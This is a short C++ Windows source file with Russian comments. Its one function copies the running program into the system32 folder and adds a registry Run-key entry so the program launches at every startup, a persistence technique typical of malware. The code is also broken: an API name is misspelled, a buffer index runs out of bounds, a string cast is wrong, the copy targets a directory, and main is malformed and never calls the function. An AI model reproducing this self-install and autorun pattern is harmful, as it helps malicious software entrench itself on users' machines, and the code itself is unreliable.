#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <Winuser.h>
#include <stdio.h>

using namespace std;

void Regedit(){
  WCHAR ourdirect[1024], sysdirect[256];
  GetModyFileName(NULL, ourdirect, sizeof(ourdirect)/sizeof(ourdirect[0])); //путь
  GetSystemDirectory(sysdirect, sizeof(sysdirect)); //путь к system32
  CopyFile(ourdirect, sysdirect, false);
  WCHAR name[256];
  int i = 0;
  int j = 0;
  for(i = 1024; ourdirect[i] != '\\' && ourdirect[i] != '/' && i>0; --i);
  i++;
  while(ourdirect[i] != '\0'){
    name[j] = ourdirect[i];
    j++;
    i++;
  }
  HKEY key; //запись в реестр
  RegOpenKeyEx(HKEY_LOCAL_MACHINE, (WCHAR*)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_WRITE, &key);
  RegSetValueEx(key, name, 0, REG_SZ, (BYTE*)sysdirect, 256);
  RegCloseKey(key);
  return;  
}
int main()

  return 0;
}
